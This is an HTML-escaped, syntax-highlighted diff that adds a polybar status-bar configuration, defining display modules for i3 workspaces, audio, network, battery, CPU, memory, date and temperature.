+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Separator &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;between workspaces
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; label-separator &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; |
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/i3]
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; internal/i3
+format &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &amp;lt;label-state&amp;gt; &amp;lt;label-mode&amp;gt;
+index-sort &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true
+&lt;/span&gt;wrapping-scroll &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Only show workspaces on the same output as the bar
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;pin-workspaces &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true
+
+&lt;/span&gt;label-mode-padding &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+label-mode-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#000&lt;/span&gt;
+label-mode-background &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.primary&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; focused &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Active workspace on focused monitor
+label-focused &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %index%
+label-focused-background &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.background-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+label-focused-underline&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.primary&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+label-focused-padding &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; unfocused &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Inactive workspace on any monitor
+label-unfocused &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %index%
+label-unfocused-padding &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; visible &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Active workspace on unfocused monitor
+label-visible &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %index%
+label-visible-background &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.label-focused-background&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+label-visible-underline &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.label-focused-underline&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+label-visible-padding &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.label-focused-padding&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; urgent &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Workspace with urgency hint &lt;span class=&quot;nb&quot;&gt;set
+&lt;/span&gt;label-urgent &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %index%
+label-urgent-background &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.alert&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+label-urgent-padding &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Separator &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;between workspaces
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; label-separator &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; |
+
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/mpd]
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; internal/mpd
+format-online &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &amp;lt;label-song&amp;gt;  &amp;lt;icon-prev&amp;gt; &amp;lt;icon-stop&amp;gt; &amp;lt;toggle&amp;gt; &amp;lt;icon-next&amp;gt;
+
+icon-prev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+icon-stop &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+icon-play &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+icon-pause &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+icon-next &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+
+label-song-maxlen &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 25
+label-song-ellipsis &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/xbacklight]
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; internal/xbacklight
+
+format &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &amp;lt;label&amp;gt; &amp;lt;bar&amp;gt;
+label &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; BL
+
+bar-width &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 10
+bar-indicator &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; |
+bar-indicator-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#fff&lt;/span&gt;
+bar-indicator-font &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+bar-fill &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ─
+bar-fill-font &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+bar-fill-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#9f78e1&lt;/span&gt;
+bar-empty &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ─
+bar-empty-font &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+bar-empty-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/backlight-acpi]
+inherit &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; module/xbacklight
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; internal/backlight
+card &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; intel_backlight
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/cpu]
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; internal/cpu
+interval &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+format-prefix &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt;
+format-prefix-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+format-underline &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#f90000&lt;/span&gt;
+label &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %percentage:2%%
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/memory]
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; internal/memory
+interval &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+format-prefix &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt;
+format-prefix-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+format-underline &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#4bffdc&lt;/span&gt;
+label &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %percentage_used%%
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/wlan]
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; internal/network
+interface &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; wlan0
+interval &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 3.0
+
+format-connected &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &amp;lt;ramp-signal&amp;gt; &amp;lt;label-connected&amp;gt;
+format-connected-underline &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#9f78e1&lt;/span&gt;
+label-connected &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %essid%
+
+format-disconnected &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;format-disconnected &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &amp;lt;label-disconnected&amp;gt;
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;format-disconnected-underline &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.format-connected-underline&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;label-disconnected &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %ifname% disconnected
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;label-disconnected-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+ramp-signal-0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+ramp-signal-1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+ramp-signal-2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+ramp-signal-3 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+ramp-signal-4 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+ramp-signal-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/eth]
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; internal/network
+interface &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; eth0
+interval &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 3.0
+
+format-connected-underline &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#55aa55&lt;/span&gt;
+format-connected-prefix &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt;
+format-connected-prefix-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+label-connected &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %local_ip%
+
+format-disconnected &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;format-disconnected &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &amp;lt;label-disconnected&amp;gt;
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;format-disconnected-underline &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.format-connected-underline&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;label-disconnected &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %ifname% disconnected
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;label-disconnected-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/date]
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; internal/date
+interval &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 5
+
+&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+date-alt &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; %d-%m-%Y&quot;&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %H:%M
+time-alt &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %H:%M:%S
+
+format-prefix &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+format-prefix-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+format-underline &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#0a6cf5&lt;/span&gt;
+
+label &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %date% %time%
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/pulseaudio]
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; internal/pulseaudio
+
+format-volume &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &amp;lt;label-volume&amp;gt; &amp;lt;bar-volume&amp;gt;
+label-volume &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; VOL %percentage%%
+label-volume-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+label-muted &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 🔇 muted
+label-muted-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#666&lt;/span&gt;
+
+bar-volume-width &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 10
+bar-volume-foreground-0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#55aa55&lt;/span&gt;
+bar-volume-foreground-1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#55aa55&lt;/span&gt;
+bar-volume-foreground-2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#55aa55&lt;/span&gt;
+bar-volume-foreground-3 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#55aa55&lt;/span&gt;
+bar-volume-foreground-4 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#55aa55&lt;/span&gt;
+bar-volume-foreground-5 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#f5a70a&lt;/span&gt;
+bar-volume-foreground-6 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#ff5555&lt;/span&gt;
+bar-volume-gradient &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false
+&lt;/span&gt;bar-volume-indicator &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; |
+bar-volume-indicator-font &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+bar-volume-fill &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ─
+bar-volume-fill-font &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+bar-volume-empty &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ─
+bar-volume-empty-font &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+bar-volume-empty-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/alsa]
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; internal/alsa
+
+format-volume &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &amp;lt;label-volume&amp;gt; &amp;lt;bar-volume&amp;gt;
+label-volume &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; VOL
+label-volume-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+format-muted-prefix &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt;
+format-muted-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+label-muted &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; sound muted
+
+bar-volume-width &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 10
+bar-volume-foreground-0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#55aa55&lt;/span&gt;
+bar-volume-foreground-1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#55aa55&lt;/span&gt;
+bar-volume-foreground-2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#55aa55&lt;/span&gt;
+bar-volume-foreground-3 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#55aa55&lt;/span&gt;
+bar-volume-foreground-4 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#55aa55&lt;/span&gt;
+bar-volume-foreground-5 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#f5a70a&lt;/span&gt;
+bar-volume-foreground-6 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#ff5555&lt;/span&gt;
+bar-volume-gradient &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false
+&lt;/span&gt;bar-volume-indicator &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; |
+bar-volume-indicator-font &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+bar-volume-fill &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ─
+bar-volume-fill-font &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+bar-volume-empty &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ─
+bar-volume-empty-font &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+bar-volume-empty-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/battery]
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; internal/battery
+battery &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; BAT0
+adapter &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; AC0
+full-at &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 98
+
+format-charging &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &amp;lt;animation-charging&amp;gt; &amp;lt;label-charging&amp;gt;
+format-charging-underline &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#ffb52a&lt;/span&gt;
+
+format-discharging &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &amp;lt;animation-discharging&amp;gt; &amp;lt;label-discharging&amp;gt;
+format-discharging-underline &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.format-charging-underline&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+format-full-prefix &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt;
+format-full-prefix-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+format-full-underline &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.format-charging-underline&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+ramp-capacity-0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+ramp-capacity-1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+ramp-capacity-2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+ramp-capacity-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+animation-charging-0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+animation-charging-1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+animation-charging-2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+animation-charging-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+animation-charging-framerate &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 750
+
+animation-discharging-0 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+animation-discharging-1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+animation-discharging-2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+animation-discharging-foreground &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.foreground-alt&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+animation-discharging-framerate &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 750
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/temperature]
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; internal/temperature
+thermal-zone &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
+warn-temperature &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 60
+
+format &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &amp;lt;ramp&amp;gt; &amp;lt;label&amp;gt;
+format-underline &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#f50a4d&lt;/span&gt;
+format-warn &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &amp;lt;ramp&amp;gt; &amp;lt;label-warn&amp;gt;
+format-warn-underline &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.format-underline&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+
+label &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %temperature-c%
+label-warn &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; %temperature-c%
